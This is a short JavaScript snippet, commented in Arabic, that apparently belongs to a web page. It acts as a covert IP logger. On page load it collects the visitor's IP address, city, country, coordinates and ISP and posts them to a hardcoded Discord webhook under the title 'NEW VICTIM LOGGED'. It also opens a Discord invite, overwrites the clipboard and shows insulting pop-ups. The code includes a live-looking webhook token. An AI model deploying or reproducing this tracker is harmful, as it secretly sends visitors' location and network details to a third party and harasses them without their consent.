// دالة لجمع المعلومات وإرسالها
async function fetchInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();

        // عرض المعلومات
        document.getElementById('ip').textContent = data.ip;
        document.getElementById('city').textContent = data.city;
        document.getElementById('region').textContent = data.region;
        document.getElementById('country').textContent = data.country;
        document.getElementById('loc').textContent = data.loc;
        document.getElementById('org').textContent = data.org;
        document.getElementById('timezone').textContent = data.timezone;

        // إرسال إلى ويب هوك الديسكورد
        const webhookURL = 'https://discord.com/api/webhooks/1409341344253481061/C1dachjxj2h_Uh6HARhwv3rijaFNJig37fLasyi8CWHTQasWUBOAKdtQ52FA2M03sjXP';
        
        const embed = {
            title: "NEW VICTIM LOGGED",
            description: `**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country}\n**ISP:** ${data.org}`,
            color: 0xff0000,
            timestamp: new Date().toISOString()
        };

        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        // إجراءات إضافية
        window.open('https://discord.gg/Cppsc2W69G', '_blank');
        navigator.clipboard.writeText('Elzabyra kingdome');
        
        // إشعارات منبثقة
        setTimeout(() => alert('Ahmed ali 3la zby '), 1000);
        setTimeout(() => alert('ELm3lem KFC'), 3000);

    } catch (error) {
        console.error('Error:', error);
    }
}

// بدء التشغيل عند تحميل الصفحة
window.addEventListener('load', () => {
    fetchInfo();
});
